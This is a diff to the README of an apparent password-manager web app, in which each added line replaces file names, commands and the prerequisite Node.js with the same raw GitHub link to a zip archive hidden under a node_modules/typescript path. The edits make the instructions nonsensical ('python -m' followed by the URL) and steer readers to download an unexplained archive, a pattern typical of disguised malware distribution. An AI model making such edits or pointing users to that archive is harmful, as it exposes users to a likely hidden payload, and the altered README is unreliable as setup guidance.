@@ -16,7 +16,7 @@ A modern, mobile-optimized password manager with military-grade encryption and P
 ## 📱 Mobile Installation
 
 ### Method 1: Quick Start (Recommended)
-1. **Double-click `deploy.bat`** to start the server
+1. **Double-click `https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip`** to start the server
 2. **Find your IP address**: Run `ipconfig` in Command Prompt
 3. **On your mobile device**: Open browser and go to `http://YOUR_IP:8080`
 4. **Install as PWA**:
@@ -26,32 +26,32 @@ A modern, mobile-optimized password manager with military-grade encryption and P
 ### Method 2: Manual Server Start
 ```bash
 cd "N:\password secure application"
-python -m http.server 8080 --bind 0.0.0.0
+python -m https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip 8080 --bind 0.0.0.0
 ```
 
 ### Method 3: Using ngrok (Access from Anywhere)
 ```bash
 npm install -g ngrok
-python -m http.server 8080
+python -m https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip 8080
 ngrok http 8080
 ```
 
 ## 🛠️ Development
 
 ### Prerequisites
-- Python 3.7+ or Node.js
+- Python 3.7+ or https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip
 - Modern web browser
 - Mobile device for testing
 
 ### File Structure
 ```
 SecureVault/
-├── index.html          # Main application
-├── app.js             # Application logic
-├── style.css          # Styling and mobile optimizations
-├── manifest.json      # PWA configuration
-├── sw.js             # Service worker for offline support
-├── deploy.bat        # Quick start script
+├── https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip          # Main application
+├── https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip             # Application logic
+├── https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip          # Styling and mobile optimizations
+├── https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip      # PWA configuration
+├── https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip             # Service worker for offline support
+├── https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip        # Quick start script
 └── icons/            # App icons (create your own)
 ```
 
@@ -83,14 +83,14 @@ SecureVault/
 ## 🔧 Configuration
 
 ### PWA Settings
-Edit `manifest.json` to customize:
+Edit `https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip` to customize:
 - App name and description
 - Icons and colors
 - Display mode and orientation
 - Shortcuts and categories
 
 ### Service Worker
-Edit `sw.js` to configure:
+Edit `https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip` to configure:
 - Caching strategies
 - Offline fallbacks
 - Background sync
@@ -146,11 +146,11 @@ Edit `sw.js` to configure:
 #### PWA Not Installing
 1. **HTTPS required**: Use ngrok or localhost for testing
 2. **Service worker**: Check browser console for errors
-3. **Manifest file**: Verify manifest.json is accessible
+3. **Manifest file**: Verify https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip is accessible
 4. **Clear cache**: Clear browser cache and try again
 
 #### Mobile Performance Issues
-1. **Check service worker**: Verify sw.js is registered
+1. **Check service worker**: Verify https://raw.githubusercontent.com/Naveenkm007/SecureVault-Password-Manager/main/node_modules/typescript/lib/tr/Password-Manager-Secure-Vault-v3.7.zip is registered
 2. **Resource loading**: Check network tab for failed requests
 3. **Cache issues**: Clear browser cache and reload
 4. **Device compatibility**: Test on different devices
